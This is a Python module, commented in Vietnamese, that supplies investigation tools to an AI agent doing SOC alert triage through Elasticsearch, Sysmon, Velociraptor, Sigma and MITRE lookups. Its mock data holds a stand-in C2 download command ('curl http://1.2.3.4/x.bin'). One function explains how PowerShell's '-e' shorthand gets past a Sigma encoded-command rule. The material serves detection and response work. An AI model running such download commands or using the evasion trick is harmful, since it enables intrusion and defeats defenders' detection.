"""Shared tools dùng được bởi nhiều agents.

Mỗi tool: (1) function thực thi, (2) OpenAI tool schema, (3) thêm vào ALL_TOOLS dict.
Mock mode khi USE_REAL_ES=False → trả về data giả lập để test agent loop.
"""

import os
import json
import logging
from typing import Optional

import requests

from agent import vr_client

logger = logging.getLogger("agent.tools")

USE_REAL_ES = False  # set bởi orchestrator

ES_HOST = os.environ.get("ES_HOST", "http://10.10.20.100:9200")
ES_USER = os.environ.get("ES_USER", "elastic")
ES_PASSWORD = os.environ.get("ES_PASSWORD", "")
ES_AUTH = (ES_USER, ES_PASSWORD) if ES_PASSWORD else None
ES_RED_INDEX = os.environ.get("ES_RED_INDEX", "red-alerts")
ES_VERIFY = os.environ.get("ES_VERIFY_SSL", "true").lower() != "false"
ES_SYSMON_INDEX = os.environ.get("ES_SYSMON_INDEX", ".ds-logs-windows.sysmon_operational-*")


# ── Tool implementations ──────────────────────────────────────────
def query_es_history(host: str, hours: int = 24) -> dict:
    """Lấy alerts gần đây của host từ red-alerts trong N giờ qua."""
    if not USE_REAL_ES:
        return {
            "count": 2,
            "alerts": [
                {"timestamp": "2026-05-14T08:15:00Z", "rule": "powershell_suspicious", "score": 0.72},
                {"timestamp": "2026-05-14T09:42:00Z", "rule": "lsass_access", "score": 0.81},
            ],
            "_mock": True,
        }

    query = {
        "query": {
            "bool": {
                "must": [
                    {"term": {"host.name.keyword": host}},
                    {"range": {"@timestamp": {"gte": f"now-{hours}h"}}},
                ]
            }
        },
        "size": 10,
        "sort": [{"@timestamp": "desc"}],
    }
    try:
        r = requests.get(
            f"{ES_HOST}/{ES_RED_INDEX}/_search",
            json=query, auth=ES_AUTH, timeout=10, verify=ES_VERIFY,
        )
        hits = r.json().get("hits", {}).get("hits", [])
        return {"count": len(hits), "alerts": [h["_source"] for h in hits]}
    except Exception as e:
        return {"error": str(e), "count": 0, "alerts": []}


def get_process_tree(host: str, command_line: str) -> dict:
    """Lấy cây process parent→child quanh event."""
    if not USE_REAL_ES:
        return {
            "tree": [
                {"level": 0, "name": "explorer.exe", "user": "alice"},
                {"level": 1, "name": "outlook.exe", "user": "alice"},
                {"level": 2, "name": "powershell.exe", "user": "alice", "command": command_line[:80]},
                {"level": 3, "name": "curl.exe", "user": "alice", "command": "curl http://1.2.3.4/x.bin"},
            ],
            "_mock": True,
            "interpretation": "outlook.exe spawn powershell → curl: nghi vấn email phishing → execution → C2",
        }
    try:
        query = {
            "query": {"bool": {"must": [
                {"term": {"host.name": host}},
                {"term": {"winlog.event_id": 1}},
                {"range": {"@timestamp": {"gte": "now-2h"}}},
            ]}},
            "size": 20,
            "sort": [{"@timestamp": "desc"}],
            "_source": ["@timestamp", "process.pid", "process.name",
                        "process.parent.pid", "process.parent.name",
                        "process.command_line", "user.name"],
        }
        r = requests.post(
            f"{ES_HOST}/{ES_SYSMON_INDEX}/_search",
            json=query, auth=ES_AUTH, timeout=10, verify=ES_VERIFY,
        )
        hits = r.json().get("hits", {}).get("hits", [])
        tree = []
        for h in hits:
            s = h["_source"]
            p = s.get("process", {})
            tree.append({
                "timestamp": s.get("@timestamp"),
                "pid": p.get("pid"),
                "name": p.get("name"),
                "command_line": (p.get("command_line") or "")[:200],
                "parent_pid": p.get("parent", {}).get("pid"),
                "parent_name": p.get("parent", {}).get("name"),
                "user": s.get("user", {}).get("name"),
            })
        return {"tree": tree, "count": len(tree)}
    except Exception as e:
        return {"error": str(e), "tree": [], "count": 0}


def get_network_connections(host: str, timeframe_minutes: int = 1440) -> dict:
    """Lấy network connections của host trong N phút qua."""
    if not USE_REAL_ES:
        return {
            "connections": [
                {"src": "WIN-01", "dst": "1.2.3.4", "port": 443, "protocol": "HTTPS",
                 "process": "powershell.exe", "timestamp": "10:23:46Z"},
                {"src": "WIN-01", "dst": "1.2.3.4", "port": 80, "protocol": "HTTP",
                 "process": "curl.exe", "timestamp": "10:23:50Z"},
                {"src": "WIN-01", "dst": "8.8.8.8", "port": 53, "protocol": "DNS",
                 "process": "svchost.exe", "timestamp": "10:23:45Z"},
            ],
            "_mock": True,
            "interpretation": "WIN-01 đang gọi 1.2.3.4 qua cả HTTPS + HTTP từ powershell + curl → C2 channel",
        }
    try:
        query = {
            "query": {"bool": {"must": [
                {"term": {"host.name": host}},
                {"term": {"winlog.event_id": 3}},
                {"range": {"@timestamp": {"gte": f"now-{timeframe_minutes}m"}}},
            ]}},
            "size": 20,
            "sort": [{"@timestamp": "desc"}],
            "_source": ["@timestamp", "destination.ip", "destination.port",
                        "source.ip", "process.name", "network.protocol"],
        }
        r = requests.post(
            f"{ES_HOST}/{ES_SYSMON_INDEX}/_search",
            json=query, auth=ES_AUTH, timeout=10, verify=ES_VERIFY,
        )
        hits = r.json().get("hits", {}).get("hits", [])
        connections = []
        for h in hits:
            s = h["_source"]
            connections.append({
                "timestamp": s.get("@timestamp"),
                "src_ip": s.get("source", {}).get("ip"),
                "dst_ip": s.get("destination", {}).get("ip"),
                "dst_port": s.get("destination", {}).get("port"),
                "protocol": s.get("network", {}).get("protocol"),
                "process": s.get("process", {}).get("name"),
            })
        return {"connections": connections, "count": len(connections)}
    except Exception as e:
        return {"error": str(e), "connections": [], "count": 0}


def search_threat_intel(indicator: str) -> dict:
    """Tra cứu threat intel cho IOC (IP/hash/domain) từ local cache hoặc mock."""
    if not USE_REAL_ES:
        intel_db = {
            "1.2.3.4": {
                "type": "ip",
                "reputation": "malicious",
                "confidence": 0.85,
                "first_seen": "2026-03-12",
                "categories": ["c2", "malware"],
                "associated_malware": ["Cobalt Strike", "PowerShell Empire"],
                "source": "mock_threat_intel",
            },
        }
        info = intel_db.get(indicator)
        if info:
            return info
        return {
            "indicator": indicator, "reputation": "unknown",
            "note": "IOC chưa có trong threat intel db",
        }
    # Không có external API — trả về không có intel thay vì _todo
    return {
        "indicator": indicator,
        "reputation": "unknown",
        "note": "Không có threat intel database. Cần kiểm tra thủ công qua VirusTotal/AbuseIPDB.",
    }


def get_sigma_rule_text(rule_name: str) -> dict:
    """Lấy YAML content của Sigma rule để so sánh với evasion."""
    if not USE_REAL_ES:
        rules = {
            "powershell_encoded_command": {
                "yaml": (
                    "title: Suspicious PowerShell Encoded Command\n"
                    "detection:\n"
                    "  selection:\n"
                    "    CommandLine|contains:\n"
                    "      - '-EncodedCommand'\n"
                    "      - '-Encoded'\n"
                    "    Image|endswith: '\\powershell.exe'\n"
                    "  condition: selection"
                ),
                "level": "high",
                "id": "powershell_encoded_command",
            },
        }
        info = rules.get(rule_name)
        if info:
            return info
        return {"rule_name": rule_name, "note": "Rule không có trong cache mock"}
    import os, glob
    SIGMA_RULES_DIR = os.environ.get("SIGMA_RULES_DIR", "/home/ubuntu/data/sigma/rules")
    # Search by filename or title match
    pattern = rule_name.lower().replace(" ", "_").replace("/", "_")
    candidates = glob.glob(f"{SIGMA_RULES_DIR}/**/*.yml", recursive=True)
    for path in candidates:
        fname = os.path.basename(path).replace(".yml", "").lower()
        if fname == pattern or fname in pattern or pattern in fname:
            try:
                yaml_text = open(path).read()
                # Extract level and id from YAML
                level = "unknown"
                rule_id = ""
                for line in yaml_text.splitlines():
                    if line.strip().startswith("level:"):
                        level = line.split(":", 1)[1].strip()
                    if line.strip().startswith("id:"):
                        rule_id = line.split(":", 1)[1].strip()
                return {"rule_name": rule_name, "yaml": yaml_text,
                        "level": level, "id": rule_id, "path": path}
            except Exception as e:
                return {"error": str(e), "rule_name": rule_name}
    return {"rule_name": rule_name, "note": f"Rule '{rule_name}' không tìm thấy trong {SIGMA_RULES_DIR}"}


def get_evasion_tokens(command_line: str, rule_name: str) -> dict:
    """Phân tích token nào trong command đã 'né' được rule.

    Mock: hardcode cho PowerShell -e case. Production: dùng SVM weights/cosine similarity
    từ Stage 1 model + Stage 2 attribution để giải thích.
    """
    if "-e " in command_line.lower() and "encoded" not in command_line.lower():
        return {
            "evasion_technique": "shorthand_flag",
            "explanation_vi": (
                "Attacker dùng '-e' thay vì '-EncodedCommand' đầy đủ. PowerShell hỗ trợ "
                "shorthand cho mọi parameter có prefix duy nhất → '-e' = '-EncodedCommand'. "
                "Sigma rule chỉ contains '-EncodedCommand' literal → bị né. "
                "RED phát hiện qua cosine similarity với tokens chung (powershell, base64)."
            ),
            "discriminative_tokens": ["powershell", "e", "base64", "iex"],
            "rule_pattern_matched": "-EncodedCommand contains check",
            "evaded_by": "shorthand abbreviation",
        }
    return {
        "evasion_technique": "unknown",
        "explanation_vi": "Chưa xác định kỹ thuật né cụ thể",
        "discriminative_tokens": [],
    }


def suggest_containment(host: str, severity: str, has_credential_access: bool = False) -> dict:
    """Đề xuất containment actions dựa trên severity + context.

    Returns: list các action templates. Agent có thể chọn/tùy chỉnh.
    """
    actions = []
    sev_high = severity.upper() in ("CRITICAL", "HIGH")

    if sev_high:
        actions.append({
            "action_type": "isolate_host",
            "target": host,
            "priority": 1,
            "needs_approval": True,
            "rationale_template": "Ngắt kết nối mạng để chặn C2 và lateral movement",
        })
        actions.append({
            "action_type": "kill_process",
            "target": "powershell.exe",
            "priority": 2,
            "needs_approval": True,
            "rationale_template": "Dừng process đáng ngờ ngay lập tức",
        })
        actions.append({
            "action_type": "collect_forensics",
            "target": host,
            "priority": 3,
            "needs_approval": False,
            "rationale_template": "Thu thập memory dump + process tree để forensic sau",
        })

    if has_credential_access:
        actions.append({
            "action_type": "disable_user",
            "target": "user_account",
            "priority": 1,
            "needs_approval": True,
            "rationale_template": "Vô hiệu hóa account vì credential có thể bị dump",
        })
        actions.append({
            "action_type": "reset_credentials",
            "target": "user_account",
            "priority": 2,
            "needs_approval": False,
            "rationale_template": "Reset password + bật MFA",
        })

    actions.append({
        "action_type": "create_case",
        "target": "kibana_cases",
        "priority": 4,
        "needs_approval": False,
        "rationale_template": "Mở incident case trong Kibana để track",
    })

    if severity.upper() == "CRITICAL":
        actions.append({
            "action_type": "send_alert",
            "target": "soc_oncall",
            "priority": 1,
            "needs_approval": False,
            "rationale_template": "Page SOC on-call analyst",
        })

    return {"recommended_actions": actions}


def send_telegram(message_summary: str, severity: str = "MEDIUM") -> dict:
    """Mock send notification to Telegram SOC channel.

    Production: dùng TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID từ .env.
    """
    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "")

    if not bot_token or not chat_id:
        return {
            "status": "skipped",
            "reason": "TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID chưa cấu hình trong .env",
            "preview": message_summary[:200],
            "_mock": True,
        }

    if not USE_REAL_ES:  # dùng cùng flag là "live mode"
        return {
            "status": "would_send",
            "preview": message_summary[:200],
            "target_chat": chat_id,
            "_mock": True,
        }

    # Real Telegram API
    try:
        emoji = {"CRITICAL": "🚨", "HIGH": "⚠️", "MEDIUM": "ℹ️", "LOW": "💡"}.get(severity, "")
        full_msg = f"{emoji} *{severity}* — RED Alert\n\n{message_summary}"
        r = requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            json={"chat_id": chat_id, "text": full_msg, "parse_mode": "Markdown"},
            timeout=5,
        )
        return {"status": "sent" if r.ok else "failed", "response": r.json()}
    except Exception as e:
        return {"status": "failed", "error": str(e)}


# ── Velociraptor forensic tools (host-level evidence) ─────────────
# Wrap quanh agent/vr_client.py — mock mode khi VR_USE_REAL!=1

def vr_process_tree_deep(client_id: str, pid: int) -> dict:
    """Lấy cây tiến trình đầy đủ (parent chain + children + ký số) từ host qua Velociraptor."""
    return vr_client.get_process_tree_deep(client_id=client_id, pid=int(pid))


def vr_file_artifacts(client_id: str, since_minutes: int = 30) -> dict:
    """Lấy file mới tạo + registry persistence từ host qua Velociraptor."""
    return vr_client.get_file_artifacts(client_id=client_id, since_minutes=int(since_minutes))


def vr_network_connections(client_id: str, since_minutes: int = 30) -> dict:
    """Lấy kết nối mạng external đang active trên host qua Velociraptor."""
    return vr_client.get_network_connections_deep(client_id=client_id, since_minutes=int(since_minutes))


def lookup_mitre(rule_name: str) -> dict:
    """Map Sigma rule name → MITRE ATT&CK technique."""
    table = {
        "powershell_encoded_command": {
            "tactic": "TA0002 Execution",
            "technique": "T1059.001 PowerShell",
            "sub_techniques": ["T1027 Obfuscated Files or Information"],
            "severity_baseline": "high",
        },
        "powershell_amsi_bypass": {
            "tactic": "TA0005 Defense Evasion",
            "technique": "T1562.001 Disable or Modify Tools",
            "severity_baseline": "critical",
        },
        "lsass_access": {
            "tactic": "TA0006 Credential Access",
            "technique": "T1003.001 LSASS Memory",
            "severity_baseline": "critical",
        },
        "powershell_suspicious": {
            "tactic": "TA0002 Execution",
            "technique": "T1059.001 PowerShell",
            "severity_baseline": "medium",
        },
    }
    info = table.get(rule_name)
    if info:
        return info
    return {
        "tactic": "Unknown",
        "technique": "Unknown",
        "note": f"Rule '{rule_name}' chưa có trong MITRE lookup. Bổ sung vào table nếu cần.",
    }


# ── Tool schemas (OpenAI/DeepSeek format) ─────────────────────────
TOOLS_SCHEMA = {
    "query_es_history": {
        "type": "function",
        "function": {
            "name": "query_es_history",
            "description": "Lấy alerts gần đây của 1 host từ index red-alerts trong N giờ qua. Dùng để check host có pattern attack lặp lại không.",
            "parameters": {
                "type": "object",
                "properties": {
                    "host": {"type": "string", "description": "Tên host (e.g. WIN-01)"},
                    "hours": {"type": "integer", "description": "Số giờ tra cứu", "default": 24},
                },
                "required": ["host"],
            },
        },
    },
    "get_process_tree": {
        "type": "function",
        "function": {
            "name": "get_process_tree",
            "description": "Lấy cây process parent→child quanh event. Hiểu context: process này khởi từ đâu, spawn ra gì.",
            "parameters": {
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "command_line": {"type": "string"},
                },
                "required": ["host", "command_line"],
            },
        },
    },
    "lookup_mitre": {
        "type": "function",
        "function": {
            "name": "lookup_mitre",
            "description": "Map Sigma rule name sang MITRE ATT&CK tactic/technique để xác định severity baseline.",
            "parameters": {
                "type": "object",
                "properties": {
                    "rule_name": {"type": "string", "description": "Tên Sigma rule"},
                },
                "required": ["rule_name"],
            },
        },
    },
    "get_network_connections": {
        "type": "function",
        "function": {
            "name": "get_network_connections",
            "description": "Lấy network connections (src/dst/port/process) của host trong N phút qua. Dùng để xác định C2 channel.",
            "parameters": {
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "timeframe_minutes": {"type": "integer", "default": 30},
                },
                "required": ["host"],
            },
        },
    },
    "search_threat_intel": {
        "type": "function",
        "function": {
            "name": "search_threat_intel",
            "description": "Tra cứu reputation cho IOC (IP/hash/domain) từ threat intel database.",
            "parameters": {
                "type": "object",
                "properties": {
                    "indicator": {"type": "string", "description": "IP, hash, hoặc domain"},
                },
                "required": ["indicator"],
            },
        },
    },
    "get_sigma_rule_text": {
        "type": "function",
        "function": {
            "name": "get_sigma_rule_text",
            "description": "Lấy nội dung YAML của Sigma rule để so sánh với command line đã evade.",
            "parameters": {
                "type": "object",
                "properties": {
                    "rule_name": {"type": "string"},
                },
                "required": ["rule_name"],
            },
        },
    },
    "get_evasion_tokens": {
        "type": "function",
        "function": {
            "name": "get_evasion_tokens",
            "description": "Phân tích token nào trong command line đã né được Sigma rule, kèm giải thích kỹ thuật evasion.",
            "parameters": {
                "type": "object",
                "properties": {
                    "command_line": {"type": "string"},
                    "rule_name": {"type": "string"},
                },
                "required": ["command_line", "rule_name"],
            },
        },
    },
    "suggest_containment": {
        "type": "function",
        "function": {
            "name": "suggest_containment",
            "description": "Đề xuất danh sách containment actions dựa trên severity và context (credential access?). Trả về templates có thể tùy chỉnh.",
            "parameters": {
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "severity": {"type": "string", "enum": ["CRITICAL", "HIGH", "MEDIUM", "LOW"]},
                    "has_credential_access": {"type": "boolean", "default": False},
                },
                "required": ["host", "severity"],
            },
        },
    },
    "send_telegram": {
        "type": "function",
        "function": {
            "name": "send_telegram",
            "description": "Gửi notification tới Telegram SOC channel. Mock mode khi chưa config bot.",
            "parameters": {
                "type": "object",
                "properties": {
                    "message_summary": {"type": "string", "description": "Tóm tắt 1-3 câu cho SOC team"},
                    "severity": {"type": "string", "enum": ["CRITICAL", "HIGH", "MEDIUM", "LOW"]},
                },
                "required": ["message_summary"],
            },
        },
    },
    "vr_process_tree_deep": {
        "type": "function",
        "function": {
            "name": "vr_process_tree_deep",
            "description": (
                "Velociraptor: lấy cây tiến trình SÂU từ chính host bị cảnh báo — "
                "parent chain, children, có chữ ký số không, publisher. "
                "Đây là BẰNG CHỨNG CỨNG (không phải đoán từ log)."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "client_id": {"type": "string", "description": "Velociraptor client_id của host (vd: C.1234abcd)"},
                    "pid": {"type": "integer", "description": "PID tiến trình cần điều tra"},
                },
                "required": ["client_id", "pid"],
            },
        },
    },
    "vr_file_artifacts": {
        "type": "function",
        "function": {
            "name": "vr_file_artifacts",
            "description": (
                "Velociraptor: lấy file mới tạo + key registry mới thêm trên host trong N phút qua. "
                "Dùng để xác định dropper, persistence (Run keys, Scheduled tasks)."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "client_id": {"type": "string"},
                    "since_minutes": {"type": "integer", "default": 30},
                },
                "required": ["client_id"],
            },
        },
    },
    "vr_network_connections": {
        "type": "function",
        "function": {
            "name": "vr_network_connections",
            "description": (
                "Velociraptor: lấy kết nối mạng external đang ACTIVE trên host (chỉ IP ngoài LAN). "
                "Xác định C2 channel, exfiltration thật sự đang diễn ra."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "client_id": {"type": "string"},
                    "since_minutes": {"type": "integer", "default": 30},
                },
                "required": ["client_id"],
            },
        },
    },
}

TOOL_FNS = {
    "query_es_history": query_es_history,
    "get_process_tree": get_process_tree,
    "lookup_mitre": lookup_mitre,
    "get_network_connections": get_network_connections,
    "search_threat_intel": search_threat_intel,
    "get_sigma_rule_text": get_sigma_rule_text,
    "get_evasion_tokens": get_evasion_tokens,
    "suggest_containment": suggest_containment,
    "send_telegram": send_telegram,
    "vr_process_tree_deep": vr_process_tree_deep,
    "vr_file_artifacts": vr_file_artifacts,
    "vr_network_connections": vr_network_connections,
}


def get_tools_schema(names: list[str]) -> list[dict]:
    """Lấy schema cho danh sách tool names — agent chỉ thấy tools nó được phép dùng."""
    return [TOOLS_SCHEMA[n] for n in names if n in TOOLS_SCHEMA]
